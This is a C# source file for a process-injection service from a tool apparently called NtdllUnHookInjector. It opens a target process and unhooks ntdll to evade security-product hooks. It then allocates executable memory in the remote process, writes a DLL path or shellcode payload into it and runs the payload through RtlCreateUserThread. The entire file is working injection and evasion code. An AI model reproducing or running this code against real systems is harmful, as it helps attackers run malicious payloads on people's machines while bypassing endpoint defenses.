using System;
using System.Runtime.InteropServices;
using Serilog;
using NtdllUnHookInjector.Core.Payloads;
using static NtdllUnHookInjector.Native.NativeMethods;
using static NtdllUnHookInjector.Native.NativeConstant;
using static NtdllUnHookInjector.Native.Delegates;

namespace NtdllUnHookInjector.Core.Services
{
    public class InjectionService : IInjectionService
    {
        public void Inject(int processId, IInjectorPayload payload)
        {
            Log.Information($"Injecting {payload.GetPayloadDescription()} into process ID: {processId}...");

            // 1. Open the target process and obtain its handle
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
            if (hProcess == IntPtr.Zero)
            {
                Log.Error($"Failed: Unable to start process. Error code: {Marshal.GetLastWin32Error()}");
                return;
            }

            // 2. Load ntdll and unhook
            IntPtr ntdll = UnhookService.GetNtdll();
            UnhookService.UnhookModule(ntdll, hProcess, @"C:\Windows\System32\ntdll.dll");

            // 3. Get the necessary ntdll delegate
            var NtAllocateVirtualMemory = UnhookService.LoadFunction<NtAllocateVirtualMemoryDelegate>(ntdll, "NtAllocateVirtualMemory");
            var NtWriteVirtualMemory = UnhookService.LoadFunction<NtWriteVirtualMemoryDelegate>(ntdll, "NtWriteVirtualMemory");
            var RtlCreateUserThread = UnhookService.LoadFunction<RtlCreateUserThreadDelegate>(ntdll, "RtlCreateUserThread");
            var NtWaitForSingleObject = UnhookService.LoadFunction<NtWaitForSingleObjectDelegate>(ntdll, "NtWaitForSingleObject");
            var NtClose = UnhookService.LoadFunction<NtCloseDelegate>(ntdll, "NtClose");

            // 4. Get the address of the LoadLibraryA function
            IntPtr remoteFunctionAddress = payload.GetRemoteFunctionAddress();

            // 5. Allocate memory in the target process to store the file path
            IntPtr baseAddress = IntPtr.Zero;
            byte[] payloadBytes = payload.GetPayloadBytes();
            UIntPtr regionSize = (UIntPtr)payloadBytes.Length;
            uint status;
            if (remoteFunctionAddress == IntPtr.Zero)
            {
                Log.Warning("Failed: Unable to get LoadLibraryW address.");
                Log.Warning("Trying to execute NtAllocateVirtualMemory using shellcode.");
                status = NtAllocateVirtualMemory(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                UnhookService.CheckStatus(status, hProcess, "Failed：Unable to allocate memory in the remote process.");
            }
            else
            {
                status = NtAllocateVirtualMemory(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                UnhookService.CheckStatus(status, hProcess, "Failed：Unable to allocate memory in the remote process.");
            }

            // 6. Write the file path to the target process's memory
            status = NtWriteVirtualMemory(hProcess, baseAddress, payloadBytes, (uint)payloadBytes.Length, out IntPtr bytesWritten);
            UnhookService.CheckStatus(status, hProcess, "Failed：Unable to write file path to remote process.");

            // 7. Create a remote thread in the target process to call LoadLibraryA
            IntPtr remoteThread;
            if (remoteFunctionAddress == IntPtr.Zero)
            {
                Log.Warning("Failed: Unable to get LoadLibraryW address.");
                Log.Warning("Trying to execute CreateRemoteThread using shellcode.");
                status = RtlCreateUserThread(hProcess, IntPtr.Zero, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, baseAddress, IntPtr.Zero, out remoteThread, out _);
                UnhookService.CheckStatus(status, hProcess, $"Failed：Unable to establish remote thread. Error code:{Marshal.GetLastWin32Error()}");
            }
            else
            {
                status = RtlCreateUserThread(hProcess, IntPtr.Zero, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, remoteFunctionAddress, baseAddress, out remoteThread, out _);
                UnhookService.CheckStatus(status, hProcess, $"Failed：Unable to establish remote thread. Error code:{Marshal.GetLastWin32Error()}");
            }

            status = NtWaitForSingleObject(remoteThread, false, IntPtr.Zero);
            UnhookService.CheckStatus(status, hProcess, "NtWaitForSingleObject");

            // 8. Cleanup
            status = NtClose(remoteThread);
            UnhookService.CheckStatus(status, hProcess, "NtClose(remoteThread)");
            status = NtClose(hProcess);
            UnhookService.CheckStatus(status, hProcess, "NtClose(hProcess)");

            Log.Information("Injection successful!");
        }
    }
}
